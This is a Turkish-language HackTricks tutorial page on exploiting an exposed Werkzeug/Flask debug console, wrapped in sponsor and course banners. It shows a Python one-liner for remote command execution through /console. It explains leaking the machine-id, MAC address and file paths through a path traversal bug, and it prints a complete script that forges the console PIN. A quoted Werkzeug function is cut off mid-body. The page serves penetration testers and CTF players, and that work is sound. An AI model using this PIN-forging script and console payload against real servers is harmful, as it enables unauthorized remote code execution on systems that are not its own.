# Werkzeug / Flask Debug

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Her yerden erişilebilir durumda olan zafiyet değerlendirme ve penetrasyon testi kurulumu**. Keşiften raporlamaya kadar 20+'den fazla araç ve özellikle tam bir pentest çalıştırın. Pentester'ları değiştirmiyoruz - onlara daha derine kazma, kabuk açma ve eğlenme zamanı kazandırmak için özel araçlar, tespit ve istismar modülleri geliştiriyoruz.

{% embed url="https://pentest-tools.com/" %}

## Konsol RCE

Eğer hata ayıklama etkinse, `/console`'a erişmeyi deneyebilir ve RCE elde edebilirsiniz.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

İnternette [bu](https://github.com/its-arun/Werkzeug-Debug-RCE) gibi birkaç saldırı da bulunmaktadır veya metasploit'te bir tane.

## Pin Korumalı - Yol Geçişi

Bazı durumlarda **`/console`** ucu noktası bir pin ile korunacaktır. Eğer bir **dosya geçişi açığı**nız varsa, o pin'i oluşturmak için gerekli tüm bilgileri sızdırabilirsiniz.

### Werkzeug Console PIN Sömürüsü

Uygulamada bir hata sayfası oluşturarak bunu zorlayın:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
"Werkzeug"ın hata ayıklama arayüzüne erişmeye çalışırken "konsol kilitli" senaryosuyla ilgili bir iletiyle karşılaşılır ve konsolu kilidini açmak için bir PIN gerektiği belirtilir. Werkzeug'ın hata ayıklama başlatma dosyasındaki (`__init__.py`) PIN oluşturma algoritmasını analiz ederek konsol PIN'ini sömürme önerilir. PIN oluşturma mekanizması [**Werkzeug kaynak kodu deposundan**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) incelenebilir, ancak potansiyel sürüm uyumsuzlukları nedeniyle gerçek sunucu kodunu bir dosya gezinti açığıyla elde etmek önerilir.

Konsol PIN'ini sömürmek için `probably_public_bits` ve `private_bits` adlı iki set değişkene ihtiyaç vardır:

#### **`probably_public_bits`**
- **`username`**: Flask oturumunu başlatan kullanıcıyı ifade eder.
- **`modname`**: Genellikle `flask.app` olarak belirlenir.
- **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Genellikle **Flask**'a çözülür.
- **`getattr(mod, '__file__', None)`**: Flask dizinindeki `app.py`'nin tam yolunu temsil eder (örneğin, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). `app.py` uygulanamazsa, **`app.pyc`** deneyin.

#### **`private_bits`**
- **`uuid.getnode()`**: Geçerli makinenin MAC adresini alır ve `str(uuid.getnode())` onu ondalık bir formata çevirir.
- **Sunucunun MAC adresini belirlemek** için, uygulama tarafından kullanılan etkin ağ arabirimini belirlemek gerekmektedir (örneğin, `ens3`). Belirsizlik durumunda, cihaz kimliğini bulmak için **`/proc/net/arp`'ı sızdırın**, ardından **`/sys/class/net/<device id>/address`** adresinden MAC adresini **çıkarın**.
- Ondalık bir MAC adresini onaltılığa dönüştürmek aşağıdaki gibi yapılabilir:
```python
# Örnek MAC adresi: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
- **`get_machine_id()`**: `/etc/machine-id` veya `/proc/sys/kernel/random/boot_id` dosyasından alınan verileri `/proc/self/cgroup`'ın son slash (`/`) sonrasındaki ilk satırıyla birleştirir.

<details>
<summary>`get_machine_id()` için kod</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Gerekli tüm veriler toplandıktan sonra, Werkzeug konsol PIN'i oluşturmak için saldırı betiği çalıştırılabilir:

Gerekli tüm veriler toplandıktan sonra, Werkzeug konsol PIN'i oluşturmak için saldırı betiği çalıştırılabilir. Betik, birleştirilmiş `probably_public_bits` ve `private_bits` kullanarak bir karma oluşturur ve daha sonra bu karma daha fazla işleme tabi tutularak nihai PIN üretilir. Aşağıda bu işlemi gerçekleştirmek için Python kodu bulunmaktadır:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Bu betik, bitlerin birleştirilerek karma algoritmasıyla PIN üretir, belirli tuzlar (`cookiesalt` ve `pinsalt`) ekler ve çıktıyı biçimlendirir. Werkzeug konsolu tarafından beklenen PIN ile eşleştiğinden emin olmak için `probably_public_bits` ve `private_bits` için gerçek değerlerin hedef sistemden doğru bir şekilde elde edilmesi önemlidir.


{% hint style="success" %}
Eğer Werkzeug'ın **eski bir sürümünde** iseniz, **karma algoritmasını sha1 yerine md5 olarak değiştirmeyi deneyin**.
{% endhint %}

## Referanslar

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Zafiyet değerlendirmesi ve penetrasyon testi için anında kullanılabilir kurulum**. 20'den fazla araç ve özellikle birlikte her yerden tam bir pentest çalıştırın. Biz pentesterları değiştirmiyoruz - onlara daha derine kazmak, kabukları patlatmak ve eğlenmek için biraz zaman kazandırmak için özel araçlar, tespit ve istismar modülleri geliştiriyoruz.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
